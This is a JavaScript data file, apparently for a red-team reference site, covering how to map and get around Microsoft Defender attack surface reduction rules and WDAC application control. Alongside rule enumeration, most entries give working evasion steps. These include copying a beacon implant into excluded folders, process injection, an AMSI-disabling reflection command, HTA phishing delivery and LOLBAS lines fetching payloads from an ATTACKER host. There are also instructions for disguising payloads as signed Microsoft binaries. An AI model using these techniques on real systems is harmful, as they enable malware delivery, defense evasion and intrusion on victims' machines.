export const asrTechniques = [
  {
    id: 'asr-rules',
    title: 'Attack Surface Reduction (ASR) Rules',
    subtitle: 'Enumerate enabled rules, audit modes, and map GUIDs to understand the exact detection surface',
    tags: ['ASR', 'MDE', 'Get-MpPreference', 'GUID mapping', 'audit mode', 'block mode', 'registry', 'HKLM\\Windows Defender Exploit Guard'],
    accentColor: 'yellow',
    overview: 'ASR rules are kernel-enforced behavioral blocks implemented by Microsoft Defender for Endpoint via the MiniFilter driver (WdFilter.sys). Each rule is identified by a GUID and operates in Disabled (0), Block (1), Audit (2), or Warn (6) mode. Block mode prevents execution; Audit mode only logs — safe to trigger while mapping coverage. Rules apply per-process at execution time and generally exempt SYSTEM-context processes, making them primarily a user-context control.',
    steps: [
      'Query active rules and states: Get-MpPreference | Select AttackSurfaceReductionRules_Ids, AttackSurfaceReductionRules_Actions',
      'States: 0=Disabled, 1=Block, 2=Audit, 6=Warn — Audit rules log but do NOT block; safe to trigger',
      'Check registry for GPO-pushed overrides: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\ASR\\Rules',
      'Map each GUID to the human-readable rule name to understand what execution path is blocked',
      'Critical rules to note: d4f940ab (Office child processes), 92e97fa1 (Win32 API from macros), 9e6c4e1f (LSASS access)',
      'Cross-reference your execution plan against enabled Block rules — pivot to an unblocked delivery path',
      'Verify ASR exemption for SYSTEM context: ASR rules typically only apply to non-SYSTEM processes — confirm on target',
    ],
    commands: [
      {
        title: 'Full ASR enumeration with GUID mapping (PowerShell)',
        code: `# Enumerate ASR rule IDs and their mode
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
# Index-correlated: position N in _Ids matches position N in _Actions
# 0=Disabled  1=Block  2=Audit  6=Warn

# Full GUID → Name mapping
$asrMap = @{
    "56a863a9-875e-4185-98a7-b882c64b5ce5" = "Block abuse of exploited vulnerable signed drivers"
    "7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c" = "Block Adobe Reader from creating child processes"
    "d4f940ab-401b-4efc-aadc-ad5f3c50688a" = "Block Office applications from creating child processes"
    "75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84" = "Block Office applications from injecting code into other processes"
    "3b576869-a4ec-4529-8536-b80a7769e899" = "Block Office applications from creating executable content"
    "be9ba2d9-53ea-4cdc-84e5-9b1eeee46550" = "Block executable content from email client and webmail"
    "26190899-1602-49e8-8b27-eb1d0a1ce869" = "Block Office communication app from creating child processes"
    "e6db77e5-3df2-4cf1-b95a-636979351e5b" = "Block persistence through WMI event subscription"
    "d3e037e1-3eb8-44c8-a917-57927947596d" = "Block JavaScript/VBScript from launching downloaded executables"
    "92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b" = "Block Win32 API calls from Office macros"
    "01443614-cd74-433a-b99e-2ecdc07bfc25" = "Block executable files without prevalence/age/trusted-list criterion"
    "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2" = "Block credential stealing from LSASS"
    "b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4" = "Block untrusted/unsigned processes from USB"
    "c1db55ab-c21a-4637-bb3f-a12568109d35" = "Use advanced protection against ransomware"
    "d1e49aac-8f56-4280-b9ba-993a6d77406c" = "Block process creations originating from PSExec/WMI commands"
    "33ddedf1-c6e0-47cb-833e-de6133960387" = "Block rebooting machine in Safe Mode"
    "c0033c00-d16d-4114-a5a0-dc9b3a7d2ceb" = "Block use of copied/impersonated system tools"
}

$ids     = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
$actions = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
$modeMap = @{0="Disabled";1="Block";2="Audit";6="Warn"}

for ($i=0;$i -lt $ids.Count;$i++) {
    $guid = $ids[$i].ToLower()
    $mode = $modeMap[[int]$actions[$i]]
    $name = if ($asrMap.ContainsKey($guid)) { $asrMap[$guid] } else { "Unknown" }
    Write-Host "$mode\t$guid\t$name"
}`
      },
      {
        title: 'Registry query — GPO-pushed ASR rules',
        code: `# Registry path for MDE/Intune policy-pushed rules
$regPath = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\ASR\\Rules"
if (Test-Path $regPath) {
    Get-ItemProperty $regPath | ForEach-Object {
        $_.PSObject.Properties | Where-Object { $_.Name -match "^[0-9a-f-]{36}$" } |
        ForEach-Object { Write-Host "$($_.Name) = $($_.Value)" }
    }
} else { Write-Host "No GPO ASR rules found" }

# Check MpPreference exclusions (applies to ALL rules)
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionOnlyExclusions
# Any path/process listed here is FULLY exempt from ALL ASR rules

# Confirm SYSTEM bypass
# Run as SYSTEM (via Beacon or PsExec):
# Get-MpPreference | Select AttackSurfaceReductionRules_Actions
# Then attempt a blocked action — ASR usually exempts SYSTEM context`
      }
    ]
  },

  {
    id: 'asr-exclusions',
    title: 'ASR Exclusion Abuse',
    subtitle: 'Find path and process exclusions that exempt code from ALL ASR rules and leverage them for unrestricted execution',
    tags: ['ASR exclusions', 'AttackSurfaceReductionOnlyExclusions', 'path exclusion', 'process exclusion', 'PPID spoof', 'inject into excluded process', 'registry exclusions'],
    accentColor: 'yellow',
    overview: 'ASR exclusions are the most impactful misconfiguration: any path or process added to AttackSurfaceReductionOnlyExclusions is exempt from ALL ASR rules simultaneously — not just specific ones. Administrators routinely exclude directories of legacy applications, AV agents, backup software, and monitoring tools. A single discovered exclusion can unlock execution paths blocked by every ASR rule on the system.',
    steps: [
      'Enumerate path/process exclusions: Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionOnlyExclusions',
      'Check registry: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\ASR\\ASROnlyExclusions',
      'For path exclusions: copy your tool/payload into the excluded directory — ASR will not evaluate it regardless of rule state',
      'For process exclusions: inject into the excluded process (CreateRemoteThread or APC) — operations run in its exempted context',
      'PPID spoof with excluded parent: spawn your tool as a child of an excluded process — inheritance may propagate exemption',
      'Common exclusion targets: C:\\Program Files\\Veeam\\, C:\\Zabbix\\, C:\\Oracle\\, endpoint scanner paths, monitoring agent directories',
      'Combine with Cobalt Strike PPID spoof or Sliver PPID config to maximize coverage',
    ],
    commands: [
      {
        title: 'Enumerating and abusing ASR exclusions',
        code: `# Enumerate all ASR exclusions (path + process)
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionOnlyExclusions
# e.g. output:
# C:\LegacyApp\
# C:\Oracle\jdk\bin\java.exe
# C:\Backup\VeeamAgent.exe

# Registry — GPO-pushed exclusions
$regExcl = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\ASR\\ASROnlyExclusions"
if (Test-Path $regExcl) { Get-ItemProperty $regExcl }

# ── Exploit path exclusion ──
# Drop payload into excluded directory — no ASR evaluation
copy C:\\implants\\beacon.exe "C:\\LegacyApp\\updater.exe"
& "C:\\LegacyApp\\updater.exe"       # Runs freely — ASR does not block

# ── Exploit process exclusion ──
# Find PID of excluded process
$pid = (Get-Process -Name "VeeamAgent").Id
# Inject shellcode into it (Cobalt Strike BOF or manual)
# CS: inject <PID> x64   — injects beacon into excluded process

# ── PPID spoof with excluded parent ──
# Spawn tools as children of the excluded process
# Uses STARTUPINFOEX + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
# Parent = excluded VeeamAgent.exe → child may inherit ASR exemption context

# ── From a beacon: enumerate exclusions ──
execute-assembly SharpASR.exe   # or
powershell Get-MpPreference | Select AttackSurfaceReductionOnlyExclusions`
      }
    ]
  },

  {
    id: 'gadget-jscript',
    title: 'GadgetToJScript — Office ASR Rule Bypass',
    subtitle: 'Execute .NET assemblies via JScript/COM outside the Office macro execution context to bypass all Office-specific ASR rules',
    tags: ['GadgetToJScript', 'JScript', 'COM scriptlet', 'wscript.exe', 'cscript.exe', 'mshta.exe', 'HTA', 'AMSI bypass', '.NET from JS', 'Office ASR bypass'],
    accentColor: 'yellow',
    overview: 'Office-specific ASR rules (Block Office child processes, Block Win32 API from Office macros, Block Office code injection) all check whether the execution context is an Office application. GadgetToJScript converts a .NET assembly into a JScript payload that instantiates it via COM object gadgets. Because wscript.exe or mshta.exe is the host — not Word or Excel — all Office-context ASR checks are skipped. An AMSI bypass must precede the .NET load to prevent CLR-level scanning of the assembly.',
    steps: [
      'Compile your offensive .NET tool as a class library (.dll) with a public entry point method',
      'GadgetToJScript: GadgetToJScript.exe -w js -e VBScript -b -c tool.dll -o payload → generates payload.js',
      'Inspect the generated JScript — understand the COM gadget chain that bootstraps the .NET CLR',
      'Prepend an AMSI bypass script block before the assembly instantiation to disable scanning',
      'Execute via wscript.exe payload.js or cscript.exe payload.js — execution context is wscript.exe, NOT Office',
      'Wrap in HTA for phishing: execute via mshta.exe payload.hta — double-click delivery, no Office required',
      'Confirm no Office ASR rules trigger: process chain is explorer.exe → mshta.exe → CLR → YourTool.dll',
    ],
    commands: [
      {
        title: 'GadgetToJScript — full build and delivery pipeline',
        code: `# ── Compile your .NET assembly ──
# Tool.cs must expose a public class with a static entry method
csc.exe /target:library /out:Tool.dll Tool.cs

# Tool.cs example structure:
# public class Entrypoint {
#     public static void Main(string[] args) { /* offensive code here */ }
# }

# ── GadgetToJScript ──
# https://github.com/med0x2e/GadgetToJScript
GadgetToJScript.exe -w js -e VBScript -b -c Tool.dll -o payload
# Output: payload.js (JScript) and optionally payload.vbs

# ── Prepend AMSI bypass to payload.js ──
# Insert at top of payload.js before the gadget chain:
$amsiBypass = @'
var sh = new ActiveXObject("WScript.Shell");
// AMSI reflection bypass via ActiveX dispatch
// Or patch via VBScript eval:
'@
# Simpler: embed AMSI patch directly in JScript using ActiveXObject("MSXML2.DOMDocument")

# ── Execute (bypasses all Office-context ASR rules) ──
wscript.exe payload.js
cscript.exe payload.js    # Console mode (shows output)
# Process tree: explorer → wscript → CLR → Tool.dll
# ASR check: "is this Office context?" → NO → no Office rules fire

# ── HTA delivery (phishing) ──
# Wrap payload.js content in HTA template:
cat payload.hta:
# <html><head><script language="JScript">
# [GadgetToJScript payload content here]
# </script></head><body></body></html>

mshta.exe payload.hta
# Or: deliver as attachment → victim double-clicks → mshta.exe runs → CLR → payload

# ── Execution chain (no Office = no Office ASR) ──
# explorer.exe → mshta.exe → CLR → Tool.dll
# ASR Rule d4f940ab: "Block Office from creating child" — NOT triggered (no Office)
# ASR Rule 92e97fa1: "Block Win32 API from Office macros" — NOT triggered`
      },
      {
        title: 'AMSI bypass prepended to JScript payload',
        code: `// Prepend to generated GadgetToJScript payload.js
// AMSI bypass using WScript.Shell + registry trick OR direct patch via COM

// Method 1: amsiInitFailed via XMLHTTP and eval
var xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
// Alternatively, use a native JScript AMSI bypass:

// Method 2: Load PowerShell and set amsiInitFailed before CLR init
// (relies on PowerShell runspace if tool uses it)
var shell = new ActiveXObject("WScript.Shell");
var proc = shell.Exec('powershell -c "$a=[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\');$b=$a.GetField(\'amsiInitFailed\',\'NonPublic,Static\');$b.SetValue($null,$true)"');

// Method 3: Patch amsi.dll before loading CLR (more reliable in GtJ context)
// Embed a minimal AMSI patch as VBScript executed before the .NET gadget:
// VBScript block that patches AmsiScanBuffer via VirtualProtect + Marshal.Copy
// This runs before .NET CLR init → AMSI is disabled for the entire session

// After the bypass, the gadget chain executes:
// var o = new ActiveXObject("ScriptControl");
// ... [GadgetToJScript generated chain]
// → .NET CLR loads → Entrypoint.Main() executes → C2 callback`
      }
    ]
  },

  {
    id: 'wdac',
    title: 'WDAC Enumeration & Bypass Strategy',
    subtitle: 'Map the active WDAC policy, identify allowed paths and signers, then select the appropriate bypass vector',
    tags: ['WDAC', 'CI.dll', 'CodeIntegrity', 'CIPolicies', 'p7b', 'ConvertFrom-CIPolicy', 'Allow rules', 'LOLBAS', 'wildcard paths', 'WldpQueryDynamicCodeTrust'],
    accentColor: 'orange',
    overview: 'WDAC (Windows Defender Application Control) is enforced at the kernel level by CI.dll — it intercepts every code execution and DLL load and evaluates it against the active policy. Policies are stored as .p7b (CMS-signed binary) blobs in C:\\Windows\\System32\\CodeIntegrity\\CIPolicies\\Active\\. Converting to XML reveals Allow rules (by path, signer, hash, or filename), which directly map to exploitation vectors. Unlike AppLocker (which runs user-mode), WDAC is kernel-enforced and survives AppLocker bypasses.',
    steps: [
      'List active policies: ls C:\\Windows\\System32\\CodeIntegrity\\CIPolicies\\Active\\ — may require admin or TrustedInstaller',
      'Convert .p7b to XML: ConvertFrom-CIPolicy -XmlFilePath out.xml -BinaryFilePath policy.p7b (Requires admin or existing CI access)',
      'Without admin: CIPolicyParser.py (offline) can decode .p7b to human-readable XML',
      'Parse XML for FileRules/Allow entries: identify FilePath wildcards, FileName match rules, SignerId refs',
      'Wildcard path attack: if C:\\Windows\\* or C:\\Program Files\\* is allowed AND you can write there, place your binary',
      'LOLBINs: binaries Microsoft-signs that are always trusted — regsvr32, mshta, msiexec, odbcconf, wmic, certutil, cmstp',
      'Scripting engines (regsvr32 /s /n /u /i:URL scrobj.dll) are often allowed even under WDAC — test each',
    ],
    commands: [
      {
        title: 'WDAC policy parsing and allow-rule extraction',
        code: `# ── List active WDAC policy binaries ──
Get-ChildItem "C:\\Windows\\System32\\CodeIntegrity\\CIPolicies\\Active\\" -ErrorAction SilentlyContinue
# File: {PolicyGUID}.p7b or SiPolicy.p7b

# ── Convert to XML (requires admin or TrustedInstaller) ──
ConvertFrom-CIPolicy -XmlFilePath C:\\Temp\\policy.xml -BinaryFilePath policy.p7b

# ── Parse allow rules from XML ──
[xml]$policy = Get-Content C:\\Temp\\policy.xml

# Path-based allow rules
$policy.SiPolicy.FileRules.Allow | Select-Object FilePath, FriendlyName, Hash |
    Where-Object { $_.FilePath } | Sort-Object FilePath

# Filename-based allow rules (OriginalFilename match)
$policy.SiPolicy.FileRules.Allow | Where-Object { $_.FileName } |
    Select-Object FileName, FriendlyName

# Signer-based rules
$policy.SiPolicy.Signers.Signer | Select-Object Name, ID, CertRoot, CertPublisher

# ── Offline parse (no admin) — CIPolicyParser.py ──
# pip install pycparser
# python3 cipolicyparser.py -i policy.p7b -o policy.xml
# Works on any system that can read the policy file

# ── Enforcement mode check ──
$policy.SiPolicy.PolicyType          # Base, Supplemental, AppID, etc.
$policy.SiPolicy.Rules.Rule | Select-Object Id, Option   # Audit vs Enforce

# ── Check WDAC via registry ──
Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config"
# TypesOfCodeIntegrityPolicyEnforcement: 0=None, 1=Audit, 2=Enforced`
      },
      {
        title: 'WDAC bypass vectors — LOLBAS and trusted paths',
        code: `# ── LOLBAS execution (Microsoft-signed = always trusted by WDAC) ──

# regsvr32 — COM scriptlet execution (works even with strict WDAC)
regsvr32.exe /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll
# Process: regsvr32 (signed) → downloads and executes COM scriptlet

# mshta — HTA execution (signed by Microsoft)
mshta.exe http://ATTACKER/payload.hta
mshta.exe "javascript:a=new ActiveXObject('WScript.Shell');a.Run('cmd.exe');close();"

# msiexec — MSI package execution (signed)
msiexec.exe /quiet /i http://ATTACKER/payload.msi

# odbcconf — DLL registration (signed, less monitored)
odbcconf.exe /a {REGSVR \\\\ATTACKER\\share\\payload.dll}

# cmstp — INF-based COM scriptlet execution (signed)
cmstp.exe /ni /s payload.inf    # INF file referencing remote SCT

# wmic — process creation
wmic.exe process call create "cmd.exe /c whoami"

# certutil — download file (signed)
certutil.exe -urlcache -split -f http://ATTACKER/payload.exe C:\\Temp\\p.exe

# ── Find writable allowed paths ──
# If C:\\Windows\\* is in FileRules/Allow:
icacls "C:\\Windows\\Tasks"         # Often user-writable
icacls "C:\\Windows\\Temp"          # Always writable
icacls "C:\\Windows\\Tracing"       # Often writable
# Copy signed/trusted binary or your payload there if the path matches a wildcard allow rule`
      }
    ]
  },

  {
    id: 'trusted-signers',
    title: 'Trusted Signers & Filename Bypass (WDAC)',
    subtitle: 'Match FileName-based allow rules via PE metadata manipulation or obtain certs from a trusted CA to satisfy Signer rules',
    tags: ['WDAC signer bypass', 'OriginalFilename', 'pefile', 'Resource Hacker', 'signtool', 'osslsigncode', 'CertRoot', 'CertPublisher', 'EKU', 'PE version info'],
    accentColor: 'orange',
    overview: 'WDAC FileName rules match against the PE file\'s OriginalFilename version resource — not the on-disk filename. This can be manipulated with any PE editor (Resource Hacker, CFF Explorer, pefile) to make a payload identify itself as a trusted binary. WDAC Signer rules trust specific certificate chains — if the policy trusts DigiCert EV or Microsoft, obtaining a cert from those CAs and signing your payload makes it fully trusted. Both are attackable with public tools; FileName is faster (no cert required).',
    steps: [
      'Parse the WDAC policy XML for FileName rules: $policy.SiPolicy.FileRules.Allow | Where-Object { $_.FileName }',
      'Also check Signer rules: $policy.SiPolicy.Signers.Signer → note CertRoot and CertPublisher values',
      'For FileName bypass: use pefile or Resource Hacker to set OriginalFilename in VS_VERSION_INFO to match allowed name',
      'For Signer bypass: identify which CA the policy trusts, obtain a code-signing cert from that CA, sign with signtool or osslsigncode',
      'Verify: signtool verify /pa /v tool.exe — then test if CI.dll accepts the binary (run in WDAC-enforced environment)',
      'DLL sideloading bypass: if allowed path + allowed signer binary loads your DLL, the DLL inherits the binary\'s trust',
    ],
    commands: [
      {
        title: 'PE OriginalFilename manipulation (Python pefile)',
        code: `#!/usr/bin/env python3
# pip install pefile
import pefile, sys

pe = pefile.PE(sys.argv[1])

# ── Print current version info strings ──
if hasattr(pe, 'FileInfo'):
    for fi in pe.FileInfo:
        for entry in fi:
            if hasattr(entry, 'StringTable'):
                for st in entry.StringTable:
                    for k, v in st.entries.items():
                        print(f"  {k.decode():30s}: {v.decode()}")

# ── To modify OriginalFilename ──
# Use Resource Hacker (GUI) or CFF Explorer for reliable edits
# pefile can read but modifying VS_VERSION_INFO is non-trivial due to struct alignment

# ── Resource Hacker approach (command line) ──
# ResourceHacker.exe -open tool.exe -save patched.exe -action addoverwrite -res versioninfo.rc -mask VERSIONINFO,,
# Where versioninfo.rc contains:
#   OriginalFilename    "CompatTelRunner.exe"
#   FileDescription     "Microsoft Compatibility Telemetry"
#   CompanyName         "Microsoft Corporation"
#   ProductName         "Microsoft Windows Operating System"

# ── After edit: verify the OriginalFilename ──
import pefile
pe2 = pefile.PE("patched.exe")
for fi in pe2.FileInfo:
    for entry in fi:
        if hasattr(entry, 'StringTable'):
            for st in entry.StringTable:
                for k, v in st.entries.items():
                    if b'OriginalFilename' in k:
                        print(f"OriginalFilename: {v.decode()}")
`
      },
      {
        title: 'Signing payload to match WDAC Signer rule (osslsigncode)',
        code: `# ── Parse WDAC policy to find trusted CAs ──
[xml]$policy = Get-Content policy.xml
$policy.SiPolicy.Signers.Signer | Select-Object Name, ID
# Output example:
#   Name: Microsoft Code Signing PCA 2011  → trust via Microsoft cert
#   Name: DigiCert EV Code Signing         → trust via DigiCert EV cert

# ── Obtain matching cert ──
# If DigiCert EV trusted: purchase EV cert from DigiCert
# Export as PKCS#12: openssl pkcs12 -export -in cert.pem -inkey key.pem -out cs.p12

# ── Sign payload (Linux) ──
osslsigncode sign \\
  -pkcs12  cs.p12 \\
  -pass    "CertPassword" \\
  -n       "Microsoft Update Service" \\
  -i       "https://microsoft.com" \\
  -t       "http://timestamp.digicert.com" \\
  -h       sha256 \\
  -in      payload.exe \\
  -out     payload_signed.exe

osslsigncode verify -in payload_signed.exe   # Must show "ok"

# ── Sign (Windows) ──
signtool.exe sign /f cs.pfx /p "CertPassword" /fd SHA256 \\
  /tr http://timestamp.digicert.com /td SHA256 \\
  /d "Microsoft Update" payload.exe
signtool.exe verify /pa /v payload.exe

# ── DLL sideloading as WDAC bypass ──
# If allowed binary loads DLL by name:
# Place your DLL in the same directory as the allowed binary
# The DLL inherits the trusted binary's execution context
# WDAC evaluates the DLL against signing rules — if DLL is also signed by trusted CA → accepted`
      }
    ]
  },
];